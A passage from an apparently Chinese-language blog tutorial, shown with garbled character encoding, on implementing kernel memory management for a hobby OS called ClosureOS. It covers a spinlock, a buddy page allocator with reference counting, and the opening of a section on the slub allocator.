class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> PtrType, <span class="hljs-keyword">typename</span> NewValType&gt;<br><span class="hljs-function">__always_inline <span class="hljs-keyword">auto</span> <span class="hljs-title">atomic_set</span><span class="hljs-params">(PtrType ptr, NewValType newval)</span> -&gt; <span class="hljs-keyword">auto</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> __sync_lock_test_and_set(ptr, newval);<br>&#125;<br><br><span class="hljs-comment">/* ... */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SPINLOCK_LOCKED 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SPINLOCK_FREE 0</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SpinLock</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">SpinLock</span>();<br>    ~<span class="hljs-built_in">SpinLock</span>();<br><br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">Lock</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">void</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">TryLock</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">bool</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">UnLock</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">void</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">Reset</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">void</span></span>;<br><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-type">atomic_t</span> counter;<br>&#125;;<br><br>SpinLock::<span class="hljs-built_in">SpinLock</span>()<br>&#123;<br>    <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">Reset</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">SpinLock::Lock</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">void</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">while</span> (!<span class="hljs-built_in">atomic_compare_and_swap</span>(&amp;<span class="hljs-keyword">this</span>-&gt;counter, SPINLOCK_FREE, SPINLOCK_LOCKED)) &#123;<br>        <span class="hljs-comment">/* infinite waiting looooop... */</span><br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">SpinLock::TryLock</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">bool</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">atomic_compare_and_swap</span>(&amp;<span class="hljs-keyword">this</span>-&gt;counter, SPINLOCK_FREE, SPINLOCK_LOCKED);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">SpinLock::UnLock</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">void</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">atomic_set</span>(&amp;<span class="hljs-keyword">this</span>-&gt;counter, SPINLOCK_FREE);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">SpinLock::Reset</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">void</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">atomic_set</span>(&amp;<span class="hljs-keyword">this</span>-&gt;counter, SPINLOCK_FREE);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x02-é¡µçº§å†…å­˜åˆ†é…å™¨ï¼šbuddy-ç®—æ³•"><a href="#0x02-é¡µçº§å†…å­˜åˆ†é…å™¨ï¼šbuddy-ç®—æ³•" class="headerlink" title="0x02. é¡µçº§å†…å­˜åˆ†é…å™¨ï¼šbuddy ç®—æ³•"></a>0x02. é¡µçº§å†…å­˜åˆ†é…å™¨ï¼šbuddy ç®—æ³•</h1><p>æˆ‘ä»¬æŒ‰æƒ¯ä¾‹å°†å†…æ ¸ä¾§çš„å†…å­˜åˆ†é…åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼šä¸€éƒ¨åˆ†æ˜¯ä»¥å†…å­˜é¡µä¸ºå•ä½çš„ç²—ç²’åº¦é¡µçº§å†…å­˜åˆ†é…å™¨ï¼Œå¦ä¸€éƒ¨åˆ†æ˜¯ä»é¡µçº§å†…å­˜åˆ†é…å™¨åˆ†é…å†…å­˜é¡µåå†å°†å…¶åˆ’åˆ†ä¸ºæ›´å¤šå°å¯¹è±¡çš„ç»†ç²’åº¦å†…å­˜åˆ†é…å™¨ï¼Œæœ¬èŠ‚æˆ‘ä»¬å°†å®ç°é¡µçº§å†…å­˜åˆ†é…å™¨</p><p><strong>ä¼™ä¼´ç®—æ³•</strong> ï¼ˆ buddy memory allocation ï¼‰æ˜¯ç¬”è€…æ‰€è§è¿‡çš„å‡ ç§é¡µçº§å†…å­˜ç®¡ç†ç®—æ³•å½“ä¸­ <strong>æ¯”è¾ƒä¼˜é›…çš„ä¸€ç§</strong> ï¼Œå› æ­¤åœ¨ ClosureOS å½“ä¸­æˆ‘ä»¬çš„é¡µçº§å†…å­˜åˆ†é…å™¨ä¹Ÿé‡‡ç”¨è¿™ç§ç®—æ³•ï¼Œæˆ‘ä»¬å°†è¿™ä¸€å†…å­˜åˆ†é…å™¨ç§°ä¸º <code>buddy system</code></p><p>æˆ‘ä»¬ä½¿ç”¨ <code>struct page</code> ç»“æ„ä½“æ¥ç®¡ç†ç©ºé—²çš„å†…å­˜é¡µï¼Œå¹¶å°†è¿ç»­çš„ç©ºé—²å†…å­˜é¡µè¿›è¡Œåˆ†é˜¶ ï¼ˆorderï¼‰ ç®¡ç†ï¼Œä¸€ä»½ N é˜¶çš„ç©ºé—²å†…å­˜é¡µè¡¨ç¤º <code>2^N</code> å¼ è¿ç»­çš„ç©ºé—²å†…å­˜é¡µï¼Œæœ€é«˜é˜¶è®¾ä¸º <code>10</code> ï¼Œä½äºåŒä¸€é˜¶çš„ç©ºé—²å†…å­˜é¡µé€šè¿‡ç¬¬ä¸€å¼ é¡µçš„ <code>list</code> å­—æ®µè¿æ¥ä¸ºåŒå‘é“¾è¡¨</p><p><img src="https://s2.loli.net/2024/06/22/XRFtE7I5NxB4hyv.png"></p><p>ç›¸åŒé˜¶çš„ä¸¤ä»½é¡µé¢äº’ç›¸ç§°ä¸º buddyï¼Œä¸ºäº†æ–¹ä¾¿è¿›è¡Œé¡µé¢ç®¡ç†ï¼Œç®€åŒ–é¡µé¢åˆ†é…æ¨¡å‹ï¼Œ <strong>æˆ‘ä»¬å°†ä¸€ä»½ buddy pages é™åˆ¶ä¸ºé¡µæ¡†å·åœ¨</strong> <code>1 &lt;&lt; order</code> <strong>ä¸Šåˆ†åˆ«ä¸º 0 ä¸ 1 çš„ä¸¤ä»½é¡µé¢</strong> ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">__always_inline <span class="hljs-keyword">auto</span> <span class="hljs-title">buddy_page_pfn</span><span class="hljs-params">(<span class="hljs-type">pfn_t</span> pfn, <span class="hljs-type">int</span> order)</span> -&gt; base::<span class="hljs-type">size_t</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> pfn ^ (<span class="hljs-number">1</span> &lt;&lt; order);<br>&#125;<br><br><span class="hljs-function">__always_inline <span class="hljs-keyword">auto</span> <span class="hljs-title">get_page_buddy</span><span class="hljs-params">(Page *p, <span class="hljs-type">int</span> order)</span> -&gt; Page*</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">pfn_t</span> pfn = <span class="hljs-built_in">page_to_pfn</span>(p);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">pfn_to_page</span>(<span class="hljs-built_in">buddy_page_pfn</span>(pfn, order));<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ä¸Šå±‚ï¼Œæˆ‘ä»¬å°†å•ä¸ªé¡µçº§å†…å­˜æ± å°è£…ä¸ºä¸€ä¸ª <code>PagePool</code> ç±»ï¼Œå…¶é€šè¿‡ä¸€ä¸ªè‡ªæ—‹é”ç¡®ä¿å†…å­˜åˆ†é…çš„çº¿ç¨‹å®‰å…¨ï¼Œç©ºé—²å†…å­˜é¡µæŒ‰ç…§å…¶æ‰€å±çš„é˜¶é“¾æ¥åˆ°å„è‡ªæ‰€å±çš„ç©ºé—²åŒå‘é“¾è¡¨ä¸­ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">inline</span> <span class="hljs-keyword">constexpr</span> base::<span class="hljs-type">size_t</span> MAX_PAGE_ORDER = <span class="hljs-number">11</span>;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">PagePool</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">PagePool</span>(<span class="hljs-type">void</span>);<br>    ~<span class="hljs-built_in">PagePool</span>();<br><br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">AllocPages</span><span class="hljs-params">(base::<span class="hljs-type">size_t</span> order)</span> -&gt; Page *</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">FreePages</span><span class="hljs-params">(Page *page, base::<span class="hljs-type">size_t</span> order)</span> -&gt; <span class="hljs-type">void</span></span>;<br><br>    <span class="hljs-comment">/* for booting stage only */</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">Init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">void</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">AddPages</span><span class="hljs-params">(Page *page, base::<span class="hljs-type">size_t</span> order)</span> -&gt; <span class="hljs-type">void</span></span>;<br><br><span class="hljs-keyword">private</span>:<br>    lib::ListHead freelist[MAX_PAGE_ORDER];<br>    lib::atomic::SpinLock lock;<br><br>    <span class="hljs-keyword">auto</span> __reinit_page(Page *p, base::<span class="hljs-type">size_t</span> order, <span class="hljs-type">bool</span> free) -&gt; <span class="hljs-type">void</span>;<br><br>    <span class="hljs-keyword">auto</span> __alloc_page_direct(base::<span class="hljs-type">size_t</span> order) -&gt; Page *;<br>    <span class="hljs-keyword">auto</span> __alloc_pages(base::<span class="hljs-type">size_t</span> order) -&gt; Page *;<br><br>    <span class="hljs-keyword">auto</span> __free_pages(Page *p, base::<span class="hljs-type">size_t</span> order) -&gt; <span class="hljs-type">void</span>;<br><br>    <span class="hljs-keyword">auto</span> __reclaim_memory(<span class="hljs-type">void</span>) -&gt; <span class="hljs-type">void</span>;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="å†…å­˜é¡µåˆ†é…ï¼šå¯¹é½åˆ°-2-N-å¼ é¡µï¼Œæ‹†é«˜é˜¶é¡µé¢"><a href="#å†…å­˜é¡µåˆ†é…ï¼šå¯¹é½åˆ°-2-N-å¼ é¡µï¼Œæ‹†é«˜é˜¶é¡µé¢" class="headerlink" title="å†…å­˜é¡µåˆ†é…ï¼šå¯¹é½åˆ° 2^N å¼ é¡µï¼Œæ‹†é«˜é˜¶é¡µé¢"></a>å†…å­˜é¡µåˆ†é…ï¼šå¯¹é½åˆ° 2^N å¼ é¡µï¼Œæ‹†é«˜é˜¶é¡µé¢</h2><p>buddy ç®—æ³•ä¸­çš„åˆ†é…æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>é¦–å…ˆä¼šå°†è¯·æ±‚çš„å†…å­˜å¤§å°å‘ 2 çš„å¹‚æ¬¡æ–¹å¼ å†…å­˜é¡µå¤§å°å¯¹é½ï¼Œä¹‹åä»å¯¹åº”çš„ä¸‹æ ‡å–å‡ºè¿ç»­å†…å­˜é¡µï¼Œè‹¥æˆåŠŸå–åˆ°åˆ™ç›´æ¥è¿”å›</li><li>è‹¥å¯¹åº”ä¸‹æ ‡é“¾è¡¨ä¸ºç©ºï¼Œåˆ™ä¼šä»ä¸‹ä¸€ä¸ª order ä¸­å–å‡ºå†…å­˜é¡µï¼Œä¸€åˆ†ä¸ºäºŒï¼Œå…¶ä¸­ä¸€ä»½è£…è½½åˆ°å½“å‰ä¸‹æ ‡å¯¹åº”é“¾è¡¨ä¸­ï¼Œå¦ä¸€ä»½å†è¿”è¿˜ç»™ä¸Šå±‚è°ƒç”¨ï¼Œè‹¥ä¸‹ä¸€ä¸ª order ä¹Ÿä¸ºç©ºåˆ™ä¼šç»§ç»­å‘æ›´é«˜çš„ order è¿›è¡Œè¯¥è¯·æ±‚è¿‡ç¨‹ï¼Œç›´åˆ°æˆåŠŸåˆ†é…æˆ–è¶…è¿‡æœ€é«˜é˜¶</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> PagePool::__alloc_page_direct(base::<span class="hljs-type">size_t</span> order) -&gt; Page *<br>&#123;<br>    Page *p = <span class="hljs-literal">nullptr</span>;<br>    Page *buddy;<br>    base::<span class="hljs-type">size_t</span> allocated = order;<br><br>    <span class="hljs-keyword">while</span> (allocated &lt; MAX_PAGE_ORDER) &#123;<br>        <span class="hljs-keyword">if</span> (!lib::<span class="hljs-built_in">list_empty</span>(&amp;<span class="hljs-keyword">this</span>-&gt;freelist[allocated])) &#123;<br>            p = lib::<span class="hljs-built_in">list_entry</span>(<span class="hljs-keyword">this</span>-&gt;freelist[allocated].next, &amp;Page::list);<br>            lib::<span class="hljs-built_in">list_del</span>(&amp;p-&gt;list);<br>            <span class="hljs-keyword">break</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            allocated++;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* failed */</span><br>    <span class="hljs-keyword">if</span> (!p) &#123;<br>        <span class="hljs-keyword">goto</span> out;<br>    &#125;<br><br>    <span class="hljs-comment">/* it means that we acquire pages from higher order */</span><br>    <span class="hljs-keyword">if</span> (allocated != order) &#123;<br>        <span class="hljs-comment">/* put half pages back to buddy */</span><br>        <span class="hljs-keyword">do</span> &#123;<br>            allocated--;<br>            buddy = <span class="hljs-built_in">get_page_buddy</span>(p, allocated);<br>            <span class="hljs-keyword">this</span>-&gt;__reinit_page(buddy, allocated, <span class="hljs-literal">true</span>);<br>            lib::<span class="hljs-built_in">list_add_next</span>(&amp;<span class="hljs-keyword">this</span>-&gt;freelist[allocated], &amp;buddy-&gt;list);<br>        &#125; <span class="hljs-keyword">while</span> (allocated &gt; order);<br>    &#125;<br><br>    <span class="hljs-keyword">this</span>-&gt;__reinit_page(p, allocated, <span class="hljs-literal">false</span>);<br><br>out:<br>    <span class="hljs-keyword">return</span> p;<br>&#125;<br></code></pre></td></tr></table></figure><p>å®Œæˆå†…å­˜é¡µåˆ†é…ä¹‹åï¼Œæˆ‘ä»¬è¿˜éœ€è¦å®Œæˆå¯¹åˆ†é…çš„è¿™ä¸€ç»„å†…å­˜é¡µçš„æ ‡è®°ï¼Œå¯¹äºä¸€ä»½ <code>order=N</code> çš„è¿ç»­å†…å­˜é¡µï¼Œæˆ‘ä»¬ä»¥å…¶é¦–é¡µä½œä¸ºæ ‡è¯†ï¼Œå…¶ä½™é¡µé¢åˆ™ä½œä¸ºé™„å±é¡µï¼Œæˆ‘ä»¬é€šè¿‡ <code>is_head</code> æ ‡å¿—ä½è¿›è¡Œæ ‡è¯†ï¼Œå¹¶ä½¿ç”¨ä¸€ä¸ªé¢å¤–çš„ order å­—æ®µå­˜å‚¨å½“å‰é¡µé¢æ‰€å±è¿ç»­å†…å­˜é¡µçš„ orderï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> PagePool::__reinit_page(Page *p, base::<span class="hljs-type">size_t</span> order, <span class="hljs-type">bool</span> free) -&gt; <span class="hljs-type">void</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-number">1</span> &lt;&lt; order); i++) &#123;<br>        p[i].is_free = free;<br>        p[i].order = order;<br>        p[i].freelist = <span class="hljs-literal">nullptr</span>;<br>        p[i].kc = <span class="hljs-literal">nullptr</span>;<br>        p[i].is_head = <span class="hljs-literal">false</span>;<br>        lib::atomic::<span class="hljs-built_in">atomic_set</span>(&amp;p-&gt;ref_count, <span class="hljs-number">-1</span>);<br>        lib::atomic::<span class="hljs-built_in">atomic_set</span>(&amp;p-&gt;map_count, <span class="hljs-number">-1</span>);<br>    &#125;<br><br>    p[<span class="hljs-number">0</span>].is_head = <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ­¤å¤–ï¼Œæˆ‘ä»¬è®¾è®¡ä¸€ä¸ªå¢åŠ é¡µé¢å¼•ç”¨è®¡æ•°çš„ API ï¼Œå½“é¡µé¢è¢«å¼•ç”¨æ—¶æˆ‘ä»¬åº”å½“è°ƒç”¨è¯¥å‡½æ•°å¢åŠ å…¶å¼•ç”¨è®¡æ•°ï¼Œåœ¨ ClosureOS å¼€å‘è§„èŒƒä¸­æˆ‘ä»¬åº”å½“åœ¨åˆ†é…é¡µé¢åè°ƒç”¨è¯¥ API å¢åŠ å¼•ç”¨è®¡æ•°ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">__always_inline <span class="hljs-keyword">auto</span> <span class="hljs-title">get_page</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Page *p)</span> -&gt; <span class="hljs-type">void</span></span><br><span class="hljs-function"></span>&#123;<br>    lib::atomic::<span class="hljs-built_in">atomic_inc</span>(&amp;<span class="hljs-built_in">get_head_page</span>(p)-&gt;ref_count);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="å†…å­˜é¡µé‡Šæ”¾ï¼šæ£€æµ‹ç›¸é‚»ç©ºé—²é¡µç»„ï¼Œ-å‘ä¸Šåˆå¹¶"><a href="#å†…å­˜é¡µé‡Šæ”¾ï¼šæ£€æµ‹ç›¸é‚»ç©ºé—²é¡µç»„ï¼Œ-å‘ä¸Šåˆå¹¶" class="headerlink" title="å†…å­˜é¡µé‡Šæ”¾ï¼šæ£€æµ‹ç›¸é‚»ç©ºé—²é¡µç»„ï¼Œ å‘ä¸Šåˆå¹¶"></a>å†…å­˜é¡µé‡Šæ”¾ï¼šæ£€æµ‹ç›¸é‚»ç©ºé—²é¡µç»„ï¼Œ å‘ä¸Šåˆå¹¶</h2><p>buddy ç®—æ³•çš„å†…å­˜é¡µé‡Šæ”¾æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>æ£€æŸ¥åŒä¸€ order çš„ç‰©ç†ç›¸é‚»é«˜åœ°å€é¡µé¢ï¼Œè‹¥ä¸ºç©ºé—²åˆ™å°†å…¶è„±é“¾ï¼Œåˆå¹¶æˆä¸ºä¸€ä»½æ–° pages</li><li>å¦åˆ™ï¼Œæ£€æŸ¥åŒä¸€ order çš„ç‰©ç†ç›¸é‚»ä½åœ°å€é¡µé¢ï¼Œè‹¥ä¸ºç©ºé—²åˆ™å°†å…¶è„±é“¾ï¼Œåˆå¹¶æˆä¸ºä¸€ä»½æ–° pages</li><li>order å¢åŠ ï¼Œè¿›å…¥ä¸‹ä¸€è½®å¾ªç¯ç›´åˆ°è¶…è¿‡æœ€å¤§ order æˆ–æ˜¯åŒä¸€ order çš„å‰å‘ä¸åå‘é¡µé¢éƒ½éç©ºé—²</li><li>æ›´æ–°æ‰€æœ‰å­é¡µé¢ä¿¡æ¯ï¼Œæœ€åå°†é¡µé¢æŒ‚åˆ°å¯¹åº” order çš„ç©ºé—²é¡µé¢é“¾è¡¨ä¸Š</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> PagePool::__free_pages(Page *p, base::<span class="hljs-type">size_t</span> order) -&gt; <span class="hljs-type">void</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (!p) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (order &gt;= MAX_PAGE_ORDER) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">this</span>-&gt;lock.<span class="hljs-built_in">Lock</span>();<br><br>    <span class="hljs-comment">/* try to combine nearby pages */</span><br>    <span class="hljs-keyword">while</span> (order &lt; (MAX_PAGE_ORDER - <span class="hljs-number">1</span>)) &#123;<br>        Page *buddy;<br><br>        buddy = <span class="hljs-built_in">get_page_buddy</span>(p, order);<br>        <span class="hljs-keyword">if</span> (buddy-&gt;type == PAGE_NORMAL_MEM &amp;&amp; buddy-&gt;is_head &amp;&amp; buddy-&gt;is_free) &#123;<br>            <span class="hljs-built_in">list_del</span>(&amp;buddy-&gt;list);<br>            <span class="hljs-keyword">if</span> (buddy &lt; p) &#123;<br>                p-&gt;is_head = <span class="hljs-literal">false</span>;<br>                p = buddy;<br>            &#125;<br>            order++;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-comment">/* we can&#x27;t combine forward or backward, just break */</span><br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">this</span>-&gt;__reinit_page(p, order, <span class="hljs-literal">true</span>);<br><br>    <span class="hljs-built_in">list_add_next</span>(&amp;(<span class="hljs-keyword">this</span>-&gt;freelist[order]), &amp;p-&gt;list);<br><br>    <span class="hljs-keyword">this</span>-&gt;lock.<span class="hljs-built_in">UnLock</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸è¿‡æˆ‘ä»¬åœ¨ ClosureOS ä¸­é€šå¸¸ <strong>å¹¶ä¸ç›´æ¥è°ƒç”¨é¡µé¢é‡Šæ”¾çš„è¿™ä¸ª API</strong> ï¼Œè€Œæ˜¯æ ¹æ®å¼•ç”¨è®¡æ•°çš„å‡å°‘æ¥å†³å®šæ˜¯å¦è¯¥é‡Šæ”¾é¡µé¢ï¼Œåœ¨å¼•ç”¨è®¡æ•°å‡å°‘ä¸ºè´Ÿæ•°å€¼æ—¶è‡ªåŠ¨é‡Šæ”¾è¯¥é¡µé¢ï¼Œä»è€Œå°†å¼•ç”¨è®¡æ•°ç®¡ç†ä¸é¡µé¢é‡Šæ”¾ç›¸ç»Ÿä¸€ï¼Œè€Œæ— éœ€å¼€å‘è€…æ‰‹åŠ¨æ£€æŸ¥ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">__always_inline <span class="hljs-keyword">auto</span> <span class="hljs-title">put_page</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Page *p)</span> -&gt; <span class="hljs-type">void</span></span><br><span class="hljs-function"></span>&#123;<br>    p = <span class="hljs-built_in">get_head_page</span>(p);<br><br>    <span class="hljs-keyword">if</span> (lib::atomic::<span class="hljs-built_in">atomic_dec</span>(&amp;p-&gt;ref_count) &lt; <span class="hljs-number">0</span>) &#123;<br>        p-&gt;pool-&gt;<span class="hljs-built_in">FreePages</span>(p, p-&gt;order);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç›®å‰è¿˜åªæ˜¯æ¯”è¾ƒç®€é™‹çš„åŸºç¡€è®¾è®¡ï¼Œå°šæœªåŠ å…¥å„ç§å¼‚å¸¸æ£€æµ‹ï¼ˆä¾‹å¦‚ <code>page::ref_count</code> å°äº <code>-1</code> çš„æƒ…å†µï¼‰ï¼Œæˆ‘ä»¬å°†åœ¨åç»­æ·»åŠ ä¸Šå®Œæ•´çš„é”™è¯¯å¤„ç†ç³»ç»Ÿï¼ˆä¾‹å¦‚ <code>kernel panic</code> ï¼‰åå†è¡Œè¡¥å……</p><h1 id="0x03-é€šç”¨å†…å­˜åˆ†é…å™¨ï¼šslub-ç®—æ³•"><a href="#0x03-é€šç”¨å†…å­˜åˆ†é…å™¨ï¼šslub-ç®—æ³•" class="headerlink" title="0x03. é€šç”¨å†…å­˜åˆ†é…å™¨ï¼šslub ç®—æ³•"></a>0x03. é€šç”¨å†…å­˜åˆ†é…å™¨ï¼šslub ç®—æ³•</h1><blockquote><p>æ³¨ï¼šæœ¬ç« æˆ‘ä»¬ <strong>æš‚æ—¶ä¸è€ƒè™‘åŠ¨æ€è™šæ‹Ÿå†…å­˜åˆ†é…</strong> ï¼ˆå³ä¼ ç»Ÿçš„ <code>vmalloc()</code> ï¼‰ï¼Œä»…è€ƒè™‘åŸºäºç›´æ¥æ˜ å°„åŒºçš„å†…å­˜åˆ†é…</p></blockquote><p>ç°åœ¨æˆ‘ä»¬åŸºäºé¡µçº§å†…å­˜åˆ†é…å™¨è¿›è¡Œå°å¯¹è±¡åˆ†é…å™¨çš„è®¾è®¡ï¼šå°å¯¹è±¡åˆ†é…å™¨ä¼šå…ˆä» buddy system åˆ†é…é¡µé¢ï¼Œå°†å…¶åˆ†å‰²ä¸ºå¤šä¸ªå°å¯¹è±¡åï¼Œå†å°†ç¬¦åˆè¦æ±‚çš„å†…å­˜å¯¹è±¡è¿”è¿˜ç»™ä¸Šå±‚è°ƒç”¨</p><p>å¯¹äºå°å¯¹è±¡åˆ†é…å™¨ï¼Œæˆ‘ä»¬ä½¿ç”¨ <strong>slub allocator</strong> â€”â€”è¿™æ˜¯ä¸€ç§åº”ç”¨äº Linux kernel ä¸­çš„ä¹…ç»æ£€éªŒçš„å†…å­˜åˆ†é…ç®—æ³•ï¼Œå…¶æ ¸å¿ƒæ€æƒ³å¦‚ä¸‹ï¼š</p><ul><li>æˆ‘ä»¬å°†ä¸åŒå¤§å°çš„å†…å­˜å¯¹è±¡è¯·æ±‚å½’åˆ°ä¸åŒçš„å†…å­˜æ± è¿›è¡Œå¤„ç†ï¼Œä¾‹å¦‚å¯¹äºå¤§å°ä¸º <code>16</code> å­—èŠ‚çš„å†…å­˜è¯·æ±‚ä» <code>kmalloc-16</code> è¿™ä¸€å†…å­˜æ± 